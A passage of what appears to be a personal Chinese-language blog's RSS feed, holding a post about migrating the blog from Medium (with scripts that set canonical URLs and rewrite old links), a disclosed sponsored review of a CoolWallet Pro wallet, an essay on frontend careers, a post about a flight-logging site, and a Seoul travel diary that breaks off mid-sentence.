AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36&#39;,      Cookie: &#39;&#39;, // 換成自己的 cookie      &#39;content-type&#39;: &#39;application/json&#39;    &#125;,    body: JSON.stringify([&#123;&quot;operationName&quot;:&quot;SetCanonicalUrl&quot;,&quot;variables&quot;:&#123;&quot;postId&quot;:id,&quot;url&quot;:fullUrl&#125;,&quot;query&quot;:&quot;mutation SetCanonicalUrl($postId: String!, $url: String!) &#123;\n  setCanonicalUrl(postId: $postId, url: $url) &#123;\n    ...PostSettingsCanonicalUrl_post\n    __typename\n  &#125;\n&#125;\n\nfragment PostSettingsCanonicalUrl_post on Post &#123;\n  __typename\n  id\n  canonicalUrl\n&#125;\n&quot;&#125;])  &#125;).then(res =&gt; res.text()).then(console.log).catch(err =&gt; &#123;    console.log(&#39;err&#39;, err)  &#125;)  &#125;main()</code></pre><p>第二個修的地方是文章的連結，需要把以前所有提到 medium 的連結都換成新的部落格連結：</p><pre><code class="js">const fs = require(&#39;fs&#39;);const path = require(&#39;path&#39;);const folderPath = &#39;./source/_posts&#39;;let urls = `/2023/09/22/coolwallet-pro-b381f545878//2023/08/30/frontend-choice-2f9f76a1614e//2023/07/30/myflightradar24-flight-tracker-120ec0c162e6/`.split(&#39;\n&#39;)const regs = []for(let url of urls) &#123;  let path = url.split(&#39;/&#39;)  let id = path[path.length - 2]  regs.push(&#123;    newUrl: url,    id,    regexp: new RegExp(&#39;https://.+/&#39;+ id, &#39;g&#39;)  &#125;)&#125;fs.readdir(folderPath, (err, files) =&gt; &#123;  if (err) &#123;    console.error(&#39;Error reading folder:&#39;, err);    return;  &#125;  for(let file of files) &#123;    if (file.indexOf(&#39;.md&#39;) &lt; 0) continue    const filePath = path.join(folderPath, file);    const content = fs.readFileSync(filePath, &#39;utf8&#39;)    console.log(filePath)    let newContent = content    for(let r of regs) &#123;      newContent = newContent.replaceAll(r.regexp, r.newUrl)    &#125;    if (newContent !== content) &#123;      fs.writeFileSync(filePath, newContent)    &#125;  &#125;&#125;);</code></pre><p>這兩個的共通點是因為 slug 不變，所以做什麼都快很多，有固定的模式就是好辦事。</p><p>做到這邊其實就差不多了，額外做的兩個小事情一個是壓縮圖片，另一個是產生 og image（就這篇在分享的時候會看到的圖），但產生 og image 之前技術部落格有做過了，所以直接複製過來就行了。</p><h2 id="總結"><a href="#總結" class="headerlink" title="總結"></a>總結</h2><p>搬家過程大概花了兩天左右，其實比想像中要快一點，主要是 Medium 本身有提供下載所有文章的功能，雖然是 HTML 檔案，但因為已經有人寫好了轉換器，所以要轉換還是滿快的。</p><p>不過另一個需要注意的是下載的內容中發文跟回覆是混在一起的，我是手動把回覆都刪掉，但這邊要自動化應該也不難，可以再省下一些時間。</p><p>總之呢，新家就是這邊啦！但之後的文章應該還是會同步在 Medium 那邊，反正有設定 canonical link 應該就問題不大，所以如果習慣使用 Medium 的，還是可以繼續用那邊。</p><p>如果想要繼續關注部落格的話，可以訂閱 RSS：<a href="https://life.huli.tw/atom.xml">https://life.huli.tw/atom.xml</a></p>]]></content>
      
      
      <categories>
          
          <category> 寫作 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 寫作 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CoolWallet Pro 冷錢包開箱文</title>
      <link href="/2023/09/22/coolwallet-pro-b381f545878/"/>
      <url>/2023/09/22/coolwallet-pro-b381f545878/</url>
      
        <content type="html"><![CDATA[<p>利益揭露：此為與 CoolWallet Pro 合作的體驗文章，但使用心得是真實的。</p><p>之前我寫了一篇<a href="/2023/05/12/after-working-at-web3-industry-for-8-months-60954d84ff0e/">在加密貨幣世界工作的感想</a></p><p>最後有提到說我自己不會想要投入加密貨幣，一個不玩加密貨幣的人寫冷錢包開箱文，不是很奇怪嗎？但其實我在那一段後面還寫了：</p><blockquote><p>其實本來就沒什麼在投入，只有秉持著「投資用的錢就是你全賠掉都不會讓日子過不下去」的原則偶爾買賣一些垃圾幣當作在買樂透而已。</p></blockquote><p>所以我本來就有一些加密貨幣，都放在幣安居多，至於有什麼幣我也忘了，反正看到哪個覺得不錯就買哪個，例如說 JavaScript 之父弄的 BAT（Basic Attention Token）或是跟錢包有關的 TWT（Trust Wallet Token），我都有買一點。就跟我上面講的一樣，反正就買了放著，幾乎半年才會去看一次。</p><p>無論之後會不會再次投入，只要你手上有幣，就有可能需要冷錢包。而我之前其實從來沒有使用過冷錢包，所以也是個滿特別的體驗，思考一陣子之後就決定接下這個邀約了。</p><p>先講一下，這篇基本上會著重在使用冷錢包的體驗跟過程，有關於安全性的部分可以自行參考他們網站上的說明：<a href="https://www.coolwallet.io/zh-hant/coolwallet_pro/">https://www.coolwallet.io/zh-hant/coolwallet_pro&#x2F;</a></p><p>有一點很值得鼓勵的是，CoolWallet 其實有不少東西都是開源的，包括手機 App 等等，更多資訊可以參考他們的部落格文章：<a href="https://www.coolwallet.io/zh-hant/coolwallet-will-open-source-its-hardware-wallets-secure-element-chip-code/">CoolWallet 不藏私 宣佈支持開源</a>。</p><p>前言就寫到這了，接下來就來開箱錢包吧！</p><h3 id="開箱時間"><a href="#開箱時間" class="headerlink" title="開箱時間"></a>開箱時間</h3><p><img src="/img/coolwallet-pro-b381f545878/1__mzdChiyRZBSU3Aw2Qubohg.jpeg"></p><p>CoolWallet Pro 主打的是輕量化設計，儘管事前已經知道，收到實品的時候還是有點被驚訝到，因為就真的只是一張卡片的大小而已，的確可以放進錢包裡面帶著走，整個包裝裡面包含了充電器、錢包本體以及一些說明書：</p><p><img src="/img/coolwallet-pro-b381f545878/1__gG4rggmL0tlUz0jM__wC7EA.jpeg"></p><p>不過錢包雖然小歸小，其實相對來說還滿完整的，卡片上有一個小的電子紙螢幕還有按鈕，充電的時候長這樣：</p><p><img src="/img/coolwallet-pro-b381f545878/1__VYtnoLX5alwwWtv4h8wk2A.jpeg"></p><p>接著就是來設定錢包啦，錢包的設定是用手機 App 來弄的，兩者透過藍芽來連線傳輸資訊，手機的介面長這樣：</p><p><img src="/img/coolwallet-pro-b381f545878/1__Ab9PiFMnXDYZDY7iA__2KcQ.png"></p><p>設定的時候就會連線到裝置，然後初次使用會產生一個助記詞，會顯示在錢包的螢幕上面，這時候就需要把這些數字抄起來。為了防止抄錯，輸入完畢以後還會要你輸入數字加總起來的結果，確認沒問題以後才會繼續設定。</p><p>這個助記詞請妥善保存，以後如果錢包不見，就只能靠這個了。</p><p>設定完成以後就來開始探索一下 App 裡的功能，其實看起來結合了不少東西，例如說可以直接在上面建立熱錢包，也可以使用一些現成的服務，如下圖：</p><p><img src="/img/coolwallet-pro-b381f545878/1__f95Hesp__apqucYc__QIMQ5g.png"></p><p>可以直接在手機 App 上面操作是滿方便的，也結合了一些 DEX 可以直接在上面換幣：</p><p><img src="/img/coolwallet-pro-b381f545878/1__zZYZDMFVTh8M529tDz__juQ.png"></p><p>提供這些功能雖然方便，但跟我對冷錢包的想像不太一樣，我自己是認為冷錢包的錢應該基本上不會動到，真的需要的話也是再轉到別的錢包，並且用別的錢包跟智慧合約串接。</p><p>畢竟跟智慧合約串接這件事情本身就有一些風險，以安全性的角度來說，當然是能多少控制一些風險比較好。</p><p>但個人使用的話應該通常也不會到這麼多手續，畢竟自己錢包互轉還是要收 gas fee，有可能是我看多了交易所的流程所以才會這樣想 XD</p><p>啟用了錢包之後，就順便從幣安那邊轉了一些錢進來：</p><p><img src="/img/coolwallet-pro-b381f545878/1__o__MRElUce1rNhcRnveCdBw.jpeg"></p><p>當然也試了一下轉錢到其他地方，在轉的時候會需要用冷錢包本身做驗證才會過關，也試試看開多個帳號：</p><p><img src="/img/coolwallet-pro-b381f545878/1__1yyopzxav8dE__Md39At4sA.jpeg"></p><h3 id="使用心得"><a href="#使用心得" class="headerlink" title="使用心得"></a>使用心得</h3><p>整體而言我覺得使用上沒什麼難度，都滿順利的，介面也很明確，很容易就能找到自己想用的功能。然後冷錢包本身確實是輕薄，就是一張信用卡或悠遊卡的感覺，能做成這麼小真的不容易。</p><p>我平常會用到的錢包操作功能其實不多，大概就是轉帳跟收款之類的，其他那些附加功能倒是用不太到，算是有點小小可惜的地方。畢竟 CoolWallet 在 App 裡面提供了滿多方便的功能，例如說要換幣或是買幣其實都可以在裡面完成，對於有需要的人來說應該是滿方便的。</p><p>以上就是 CoolWallet Pro 冷錢包的開箱分享，如果有需要的話可以用我的推薦連結購買：<a href="https://www.coolwallet.io/product/coolwallet-pro/?ref=nzgzymv">https://www.coolwallet.io/product/coolwallet-pro/?ref=nzgzymv</a>，購買時可以輸入優惠碼 huli95，就可以享有 95 折的優惠。</p>]]></content>
      
      
      <categories>
          
          <category> Others </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Others </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>讓前端成為選擇</title>
      <link href="/2023/08/30/frontend-choice-2f9f76a1614e/"/>
      <url>/2023/08/30/frontend-choice-2f9f76a1614e/</url>
      
        <content type="html"><![CDATA[<p>最近看到前端臉書討論區的一篇<a href="https://www.facebook.com/groups/f2e.tw/posts/6427388497298461/?__cft__%5B0%5D=AZVbdV7Y4Sw88x23-U_KW9gBQetMa7BzP_I_OMpROcM8gzxPNUlVh2_y_WOF0B44nzlE9ImSVOnKtn_RL6uhdp7O4ClqXE7idujXjDWRprO3AVn_OK1p81rcUxIdOy66_NkE2I8rLhxPG3yyq-iHYESg&__tn__=,O,P-R">貼文</a>之後有一些感想，就順便寫下來了。</p><p>那篇貼文主要是在說不要把自己侷限在前端工程師，整個網頁的世界還有很多值得探索的地方，例如說後端啦或是一些部署的東西等等。</p><p>雖然說我不覺得每個人都需要往全端邁進，都必須擁有「可以在工作上寫後端程式碼」的能力，但我認同這個概念的大方向，就是「不要被前端所侷限住了」。</p><p>身為前端工程師，理所當然我們必須懂前端，必須知道怎麼樣做出一個網站的前端，那除了前端之外的其他任務呢？我們也有義務需要參與嗎？還是可以用：「我只是前端，這應該是___負責的」這個理由去拒絕一些任務？</p><p>這個回答顯然會根據任務的不同而改變。</p><p>舉個最極端的例子，叫一個前端工程師去管財務算帳，怎麼想都不覺得這是合理的工作內容，那如果叫一個前端工程師去幫忙寫一些後端呢？似乎也有一些討論空間，再離前端更近一點，讓前端工程師寫前端專案部署的 Dockerfile 呢？這算是前端必須負責的，還是公司的 SRE 要做的呢？</p><p>先不管一些極端的案例，在實際工作中，本來就會有許多模糊的狀況存在，有些並沒有對錯，而你也可以做選擇。你可以選擇把這些工作接下來，也可以選擇不接，或甚至是去網路上發文，問說大家在工作上是不是都這樣，這樣是否合理。</p><p>但就算不合理，不代表它不存在，合不合理跟現實狀況是兩回事，就像臺灣很多道路設計也不合理，但因為各種原因，它就是存在。從現實面來看，你已經無法避開「走在設計不良的道路」上這件事情，因此你能做的第一點是參與公共事務，盡可能讓未來不要出現這些不合理的設計，第二點是走在路上的時候小心一點，盡可能增加自己的存活機率，或也可以不管它，當作沒看到。</p><p>而我前面提的狀況也是這樣的，先不論合不合理，現實狀況就是在我自己的職涯當中，就算職稱是「前端工程師」，也不保證真的只會碰到前端，完全不用接觸伺服器或是其他部分。</p><p>而且仔細想一想，就會發現這件事情很合理。</p><p>我這邊指的「接觸」不是代表要你去寫後端程式，我自己是幾乎沒碰過這種狀況，更多時候其實是開發上必然會碰到的。舉例來說，前端專案寫完之後應該怎麼部署？這件事情當然可以跟 SRE 討論，但你自己必須先知道這個專案怎麼 build，怎麼跑起來，要下哪些指令，最後是以什麼樣的形式建置出來。</p><p>是一些靜態檔案而已，還是需要一台新的 server 動態跑？需要一台 server 的話，該怎麼跑起來？有什麼其他需求？</p><p>再來就是實際開發的時候，有些狀況可能需要在本機把後端跑起來，我有碰過用 docker 的狀況，也有碰過需要自己安裝環境跑 Java、MySQL 以及 Nginx 等等一堆有的沒有的東西，還需要自己進資料庫下一些指令，才能成功把專案跑起來。</p><p>這些都代表在工作上你很有可能會需要一些除了 JavaScript 以外的知識。</p><p>再者，身為網頁前端工程師，我認為後端知識本來就是必備的，就像我之前寫過的<a href="https://blog.huli.tw/2019/08/21/real-front-end-learning-path/">紮實的網頁前端學習路線與資源推薦</a>有提到：</p><blockquote><p><em>「網頁前端」，這同時代表著「網頁裡的前端」以及「網頁與前端」兩個意思。網頁分為前端跟後端，如果你只理解前端，你是永遠不可能理解整個網頁的。就如同我在第五點網路基礎概念裡面提到的一樣，許多人都是缺乏了整體概念，才會導致出錯時定位錯問題，或是根本不知道問題發生在哪裡。學習後端最主要的理由就是補齊自己缺少的概念，當發生問題時你才知道問題到底出在哪裡。</em></p></blockquote><p>如果只把自己侷限在「HTML、CSS 與 JavaScript」，那就看不到網站的全貌，缺少了整體架構的概念。</p><p>我自己在工作中其實也寫過一點後端，但通常都是自己要求的，我會說：「這個簡單，我來吧！」。例如說要寫一個產生 PDF 報告的服務好了，PDF 這一段是 HTML 轉 PDF，顯然是前端工程師比較適合做，而後端的話就是簡單開一個 server 接收資料，丟給 headless browser 轉換以後再回傳檔案，我覺得自己做比較快，也比較能掌握整個服務，就自己來了。</p><p>我會寫一些後端，但不會稱自己是全端工程師，也不會在工作上主動去接後端的任務。但如果真的需要救火或是支援，我也可以擔下這個任務。</p><p>這是在技術上不被前端所侷限，可以讓自己擁有更多技能，而還有一種則是不被團隊中的角色所侷限，就是我前幾天看的 Taiming 寫的<a href="https://just-taiming.medium.com/%E5%BF%83%E5%BE%97-2023-webconf-%E7%82%BA%E8%87%AA%E5%B7%B1%E7%95%99%E4%B8%8B%E8%A8%98%E9%8C%84%E7%9A%84%E5%8F%83%E8%88%87%E5%BF%83%E5%BE%97-8a30bd106a5b">【心得】2023 WebConf 為自己留下記錄的參與心得</a>中，PJ 提到的觀念：</p><blockquote><p><em>PJ 也告訴我們一個很重要的觀念，「你也是團隊的一份子，不要被角色侷限住」。DevOps 相關的建置，一定要由 DevOps 工程師來做嗎？這流程的東西不就是 PM 要處理的，關我什麼事？但如果我們自己放下這些想法上的侷限，或許團隊就會因為我們的付出而變得更好。</em></p></blockquote><p>開頭講的臉書那篇貼文談的比較像是技術上的發展，而 PJ 那一段則是再往外擴張到團隊，一個人強終究是一個人，但如果能帶動整個團隊的發展，能發揮的影響力就更大，通常也代表著在工作上你的價值會更高。</p><p>但說穿了，最有價值的能力就是「解決問題」，如果有個人像小叮噹那樣什麼問題都可以變出一個法寶來解決，自然也就會很有價值。</p><p>可是通常我們沒這麼厲害，光是能做到「解決技術相關的問題」就不容易了，這個的意思是小明原先可能做後端，接著公司說：「我們接下來要做一些資料工程的建置，交給你負責吧」，於是小明跑去從零開始研究資料工程有哪些東西要做，然後把這個架構都弄好，專案順利上線。</p><p>過了半年，公司又跟小明說：「最近 Web3 很夯，你去研究一下吧，順便寫個智慧合約出來看看」，於是小明轉去研究這個領域，還真的開始開發智慧合約，並且在時間內交出了 MVP。</p><p>像小明這種人就是「能夠解決問題的人」，以我自己的經驗來說，這種人大概是最難找的，但同時也是對公司比較有價值的。</p><p>如果身為前端工程師，卻完全只懂網頁前端的東西，那或許成為前端不是選擇，而是侷限，是「除了這個我其他都做不了，所以只能做前端」。</p><p>如果能夠學會更多東西，讓前端成為選擇，那不是很棒嗎？就有了更多的職涯發展空間，也有了更多選擇權。</p><p>當然，如果真的只會前端但是做到超級深也是很有價值的，成為「能夠解決特定領域的艱深問題」的人，像是對瀏覽器運作超級熟，各種前端原理跟可能碰到問題的地方都暸若指掌之類的。</p><p>但問題就會變成以實際層面來看，有多少公司需要這種人呢？是需要「能夠解決各種技術整合問題」的需求多，還是「能夠解決特定領域的艱深問題」的多呢？另一方面，你想成為哪一種呢？</p><p>又或許是那句經典名言：「我全都要」。</p><p>最理想的情形大概是架構師（Architect）這種角色了，就像<a href="https://dotblogs.com.tw/regionbbs/2020/12/06/architect_role_definition">架構師 (Architect) 的角色</a>這篇裡面提到的圖一樣，來源：<a href="http://www.codingthearchitecture.com/presentations/sa2009-broadening-the-t/">http://www.codingthearchitecture.com/presentations/sa2009-broadening-the-t/</a></p><p><img src="/img/frontend-choice-2f9f76a1614e/1__fk__zOQI14WxrgoQeTv10aw.png"></p><p>既能解決各種技術問題，同時也具有一定的深度。</p><p>不過這有點扯遠就是了，我一開始想聊的其實只有底下幾句。</p><p>想當個好的前端工程師，後端是必備技能，你不一定需要在工作上寫後端，但必須知道後端是怎麼運作的，不能完全沒有概念，否則永遠都掌握不到全貌。</p><p>讓前端成為你的選擇，而不是侷限。</p>]]></content>
      
      
      <categories>
          
          <category> 職涯 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 職涯 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>記錄你的飛行軌跡：myflightradar24</title>
      <link href="/2023/07/31/myflightradar24-flight-tracker-120ec0c162e6/"/>
      <url>/2023/07/31/myflightradar24-flight-tracker-120ec0c162e6/</url>
      
        <content type="html"><![CDATA[<p><img src="/img/myflightradar24-flight-tracker-120ec0c162e6/1__vZY26YMG8ggdr3Nd6YMxkA.png"></p><p>之前在推特上面發了這個圖，好像還滿多人對這服務有興趣的，簡單寫一篇分享一下。</p><p><a href="https://my.flightradar24.com/">https://my.flightradar24.com/</a> 是一個可以記錄自己飛行軌跡的服務，只要註冊帳號以後，就可以在上面新增自己搭過的航班，看見上面的圖表。</p><p>在新增航班時只需要輸入日期跟航班號碼即可，但航班號碼只會抓最新的，如果你是要新增以前的資料，有可能會抓不到或是抓錯，就需要自己調整，介面如下：</p><p><img src="/img/myflightradar24-flight-tracker-120ec0c162e6/1__LkW4KPscMImf2vC0DnBWDQ.png"></p><p>然後有些資料是選填的，例如說艙等、座位跟理由，還可以填一個 personal note，方便自己紀錄：</p><p><img src="/img/myflightradar24-flight-tracker-120ec0c162e6/1__Dln3Tflv__6EAV8BMQEjmJA.png"></p><p>而且功能其實不只這樣，在 Profile 的頁面往下拉還會有各種圖表跟數字，很適合數據控使用，可以看到很多資料，例如說最常飛哪個航線或甚至是最常搭哪一種飛機：</p><p><img src="/img/myflightradar24-flight-tracker-120ec0c162e6/1__ZSQYldpU81nXGdLvLAIsAQ.png"></p><p>除了這些統計數據以外，當然也可以看到航班一覽表，在整理的時候才會發現：「對耶原來我去過這裡」。</p><p><img src="/img/myflightradar24-flight-tracker-120ec0c162e6/1__cCht3cH58K__EvKcD8xhIqQ.png"></p><p>另外，可以設置 profile page 的權限，例如說：</p><ol><li>私人</li><li>好友（連接 Facebook 或是 Twitter）</li><li>只顯示 profile 統計數據頁面</li><li>連航班一覽表也顯示</li></ol><p>雖然說好像公開也不會怎樣，但我在網路上找了一下好像滿少人公開的，就先只開到統計頁面了：<a href="https://my.flightradar24.com/aszx87410">https://my.flightradar24.com/aszx87410</a>，有想要看實際呈現的可以點開來看。</p><p>想要用這服務的話建議馬上開始，越晚用的話需要新增的東西越多（如果你想把以前搭過的也放進來的話），像我就花了兩三個小時才好不容易把以前搭過的都新增進來。</p><p>最後再次附上網址：<a href="https://my.flightradar24.com/">https://my.flightradar24.com/</a></p>]]></content>
      
      
      <categories>
          
          <category> 旅遊 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 旅遊 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2023 年 7 月南韓十日遊心得：首爾篇</title>
      <link href="/2023/07/27/2023-july-korea-trip-seoul-92ba2d0608ff/"/>
      <url>/2023/07/27/2023-july-korea-trip-seoul-92ba2d0608ff/</url>
      
        <content type="html"><![CDATA[<p>這是南韓心得的下集，沒看過上集的話可以點這邊：<a href="/2023/07/27/2023-july-korea-trip-busan-a475e484e1fc/">2023 年 7 月南韓十日遊心得：釜山篇</a>。</p><h3 id="Day6：從釜山到首爾"><a href="#Day6：從釜山到首爾" class="headerlink" title="Day6：從釜山到首爾"></a>Day6：從釜山到首爾</h3><p>這天早上去吃了儂特利，在韓國看起來也是滿多分店的，有自助點餐機所以很方便，味道的話倒是沒什麼特別的。</p><p>中午退房之後去釜山站搭韓國高鐵 KTX，表定要搭兩個半小時左右的車，大概是一點從釜山上車的，然後中途似乎有些不明原因 delay，所以最後四點才抵達首爾。</p><p>到首爾以後這次新的住宿是 <a href="https://goo.gl/maps/ixT7TsMuiM7sz1iv5">Jongro Amare Hotel</a>，是在 Booking.com 上面好不容易找到的高 CP 值住宿，三個晚上是 8606 台幣，一個晚上 2868 台幣，雖然說比釜山高了不少，但是在首爾已經算便宜的了。我那時候在訂房網站上面找好久才看到的，不然其他地點 OK 內裝也 OK 的都要破萬了。</p><p>晚餐去吃世光烤腸，價格偏貴兩個人是 53000 韓元，折合台幣 1300 元，點的是一個綜合套餐，有各種部位（是什麼部位我也不知道），炭香味是真的很重很讚，超級下飯，但問題是有一個部位都是油其實滿膩的，然後另一個部位似乎沒有烤得很好導致很難咬，有點可惜。</p><p>吃完之後趁著這天沒雨，去弘大逛了一下之後就回去睡覺了。</p><h3 id="Day7：悠閒的一天"><a href="#Day7：悠閒的一天" class="headerlink" title="Day7：悠閒的一天"></a>Day7：悠閒的一天</h3><p>這天依舊下著一點雨，因此也沒什麼行程。</p><p>其實原本來首爾也只有找了一些吃的，其他地方倒是沒什麼特別想要逛的，所以整個行程都很悠閒，早上一直在飯店看電視滑手機，待到中午吃飯時間出門覓食，最後挑了一個附近的雞肉鍋：</p><p><img src="/img/2023-july-korea-trip-seoul-92ba2d0608ff/1__VOklFqTLIsAw0EEkHc2psQ.jpeg"></p><p>這間店的特色是價格便宜，這一鍋只要 20000 韓元，台幣 490 塊，在其他店吃可能會到 1.5 倍或是更貴，湯裡面有一些年糕跟餃子，味道也都很不錯。</p><p>吃完之後就散步回飯店繼續休息，一直到晚上吃飯時間才又出來。晚上的雨更大了一些，買了漢堡王的暗黑破壞神套餐，12000 韓元約 293 台幣，再買了一些路邊的辣炒年糕跟點心。</p><p>邊在房間吃著晚餐，邊愜意地看著超大電視上爆哥的跑跑卡丁車比賽還有 LOL 英雄聯盟地獄豬的史詩級戰役，真是滿足的一天。</p><h3 id="Day8：看秀囉"><a href="#Day8：看秀囉" class="headerlink" title="Day8：看秀囉"></a>Day8：看秀囉</h3><p>這天中午吃了明洞那一帶的雪濃湯，發現韓國這種湯湯水水的東西似乎都是沒什麼調味的，之前吃的豬肉湯飯也一樣，都是要自己再額外加東西去調味比較好吃，或也可以配那些韓式小菜之類的。總之雪濃湯的味道普通，應該是不會再吃一次。</p><p>下午兩點去看了明洞的亂打秀，記得以前小時候家族旅遊來韓國好像也看過，但是看完之後卻沒什麼印象有看過。如果有來韓國的話還滿推薦可以來看看的，表演精彩然後很適合帶小朋友去，一堆小朋友都笑得很開心，表演全程大概 90 分鐘左右，記得入場前先上廁所，因為座椅不大所以坐中間很難出來。</p><p>看完表演繼續在明洞晃，發現那些小吃都不便宜就沒有買了，但如果下次還會再去的話，不考慮預算直接爆吃一波好像也不錯，想想就覺得滿爽的。</p><p>晚上則是吃了飯店附近的排骨湯，也是一個人 10000 韓元左右，雖然說有點辣但是還滿好吃的，排骨很嫩然後配飯跟小菜很好吃。</p><p>吃完之後去了首爾我最喜歡的景點散步：清溪川。</p><p>這是白天的清溪川：</p><p><img src="/img/2023-july-korea-trip-seoul-92ba2d0608ff/1__NnG2fLrSkjXgEf6G4qjJSA.jpeg"></p><p>這是晚上的清溪川，很漂亮我很喜歡：</p><p><img src="/img/2023-july-korea-trip-seoul-92ba2d0608ff/1__c0QWxssaNJl10ilvf__32mw.jpeg"></p><p>以前的文章裡面不知道有沒有提過，但我很喜歡這種有草有樹有河還有燈光的地方，而且一定要是黃色的燈才有那個氣氛。</p><h3 id="Day9：四年後再訪松島中央公園"><a href="#Day9：四年後再訪松島中央公園" class="headerlink" title="Day9：四年後再訪松島中央公園"></a>Day9：四年後再訪松島中央公園</h3><p>2019 年我一個人到韓國旅遊的時候，因為有一天的班機比較早所以想找個離機場近一點的地方，就發現了松島這個離機場相對來說比較近的地點，在那邊待了一個晚上。</p><p>整體而言我很喜歡那邊的氛圍，因為飯店旁邊就是一個很大的中央公園，晚上的時候很符合我前面所講的：「有草有樹有河有燈光」，十分漂亮。因此這次的旅程，我就決定了最後一站就是松島了。</p><p>中午退房之後先去附近的義大利麵店吃飯：</p><p><img src="/img/2023-july-korea-trip-seoul-92ba2d0608ff/1__G__ohe2N06rCJMMJ6UcMhrA.jpeg"></p><p>出乎意料的好吃，價格的話是 9000 韓元，台幣 220 塊，感覺跟台北差不多。</p><p>接著就是搭車去松島了，路途其實比我想像中更遙遠一點，搭捷運要轉個兩次車，差不多要一個半小時才能抵達。抵達那邊之後先去 check-in，這次住的是五星級的 <a href="https://goo.gl/maps/jQ8StE6zoFHCij349">Central Park Hotel</a>，我四年前也是住這裡，一個晚上是 3028 台幣，以五星級來說算是滿划算的吧。</p><p>接著在飯店裡面休息一下到晚餐時間，吃了從 Google Maps 上面看到的蔘雞湯，一碗是 17000 韓元，台幣 415 元，算是蔘雞湯的正常價格。</p><p><img src="/img/2023-july-korea-trip-seoul-92ba2d0608ff/1__qzBrY2IqLrzn2OKI__YGzIA.jpeg"></p><p>吃完之後就去松島中央公園散步，跟我印象中的差不多，有點大安森林公園的感覺（因為四周也都是大樓，然後都很大），但是更漂亮一些：</p><p><img src="/img/2023-july-korea-trip-seoul-92ba2d0608ff/1__zIOExKasky204775M9o7pQ.jpeg"><br><img src="/img/2023-july-korea-trip-seoul-92ba2d0608ff/1__2IEhkNXFYfzoA7baPbN6Hw.jpeg"></p><p><img src="/img/2023-july-korea-trip-seoul-92ba2d0608ff/1__U__O7HMQ6XO__vx__QbDFFpVw.jpeg"></p><p>最後去逛了附近的樂天超市，買了一些零食，去之前有上網搜尋一下，買到的零食都滿好吃的。</p><h3 id="Day10：空中女王波音-747-商務艙初體驗"><a href="#Day10：空中女王波音-747-商務艙初體驗" class="headerlink" title="Day10：空中女王波音 747  商務艙初體驗"></a>Day10：空中女王波音 747  商務艙初體驗</h3><p>雖然上一集的開頭有寫說是看了去釜山玩很便宜才心動的，但實際在查機票的時候發現沒有特價機票，買虎航的話大概是 8000 左右，而大韓航空大概是 10000 塊上下，沒有差很多。</p><p>在查機票的時候，發現了回程首爾的飛機是 A380，這是一台有兩層的飛機，第二層全部都是商務艙的座位（我以前搭過這台飛機的頭等艙，可以參考：<a href="/2019/10/14/etihad-a380-auh-icn-first-class-352fdbbc08db/">EY876 AUH-ICN A380 阿提哈德頭等艙體驗心得</a>）。</p><p>因此我做了一個決定，那就是去程經濟艙，回程商務艙，這樣的票價是 17800，我覺得在合理範圍之內，多花個幾千塊體驗一下 A380 的商務艙跟首爾的大韓航空貴賓室，值得。</p><p>這天早上退房之後就搭了計程車去仁川機場，因為是大韓航空主場，所以機場有額外設一區是給商務艙報到的。不過報到完之後過安檢就一起過安檢了，沒有其他特殊服務。</p><p>貴賓室的話餐點普通，因為是早餐時段就提供了一些麵包沙拉之類的，特別的是還有提供辛拉麵的杯麵，而且一堆人都在吃，我們也跟風吃了一碗，有點辣但是味道還不錯。</p><p>後知後覺的我一直到上了飛機以後，才發現這台飛機其實不是 A380，而是臨時換成了波音 747–8，很巧的是我前幾天才在 PTT 航空版看到有人分享的心得文：<a href="https://www.ptt.cc/bbs/Aviation/M.1690108143.A.4C4.html">大韓航空 KE186 TPE-ICN B747-8i 商務艙</a></p><p>雖然原本是想搭 A380，但看起來搭到這麼稀有的 747–8 也是滿幸運的，而且座椅似乎更舒服了一點。</p><p><img src="/img/2023-july-korea-trip-seoul-92ba2d0608ff/1__39rLoKpzbQnuiXtUXI5uJA.jpeg"></p><p>餐點的話我是本來就有在網路上先選好，是選牛排：</p><p><img src="/img/2023-july-korea-trip-seoul-92ba2d0608ff/1__1__AIxKBaSlieOd8MRIjPPg.jpeg"></p><p>味道很不錯，牛排很好吃而且熟度很剛好，配菜的馬鈴薯、豆莢跟蘑菇也表現出色，是很滿足的一餐。</p><p>雖然說商務艙這種東西是「想要」不是「需要」，而且航程只有短短兩個多小時而已，不過搭起來還真的是滿爽的，在商務艙上面也不用擔心飛機 delay 或什麼的，反正坐得舒舒服服的，久久搭個一次似乎滿不錯的，也算是犒賞自己。</p><h3 id="花費總結"><a href="#花費總結" class="headerlink" title="花費總結"></a>花費總結</h3><p>又到了計算錢錢的時刻了。</p><p>機票總共花了 35600 元。</p><p>住宿花了 17600 元，平均一天的住宿是 1955 元，很明顯首爾拉高了不少平均。</p><p>吃的話大概是花了個 11200 台幣，平均一個人一餐是 330 元，有點偏貴，而且這個吃還沒包含我們去便利商店買的跟零食小吃之類的，主要是有幾餐（地獄廚房、烤腸跟韓式烤肉）拉高了平均。</p><p>看了一下我之前去福岡的文，吃的部分平均差不多，住宿的話因為釜山的關係便宜了不少。</p><p>上面這樣加起來是 64400 元，再加上其他交通啦，門票啦跟沒算進去的零食點心之類的，乘個 1.3 好了，就是 83720 元，這樣一天的話就是 8372 元，一個人平均一天是 4200 元左右。</p><p>之前去日本九州的時候一人天大概 4000 元，澳門是 5000 元，這樣算起來的話這次韓國行應該也還在正常範圍裡面。</p><p>這次韓國之旅算是倒吃甘蔗吧，前幾天不是下大雨就是大太陽，天氣滿差的，而且身體狀況也不太好，不過後幾天有慢慢好轉了，天氣也沒有這麼糟，都是可以出門走走的陰天。</p><p>韓國的食物我是滿喜歡的，雖然說不一定每道小菜都喜歡，但看著桌上一堆小菜心情就是好，這次有些沒吃到的下次可以再補，像是韓式炸雞或是炸醬麵之類的。</p><p>話說那邊的便利商店超多東西都是買一送一或是買二送一，常常結帳的時候店員講我們才發現原來有買一送一，總覺得滿優惠的。</p><p>景點的話倒是把一些知名的地方都去了，下次再去的話一樣會選擇釜山，一樣會選擇海雲台，但會選海景飯店之類的，我 2019 去釜山的時候住的是海景第一排，那個 view 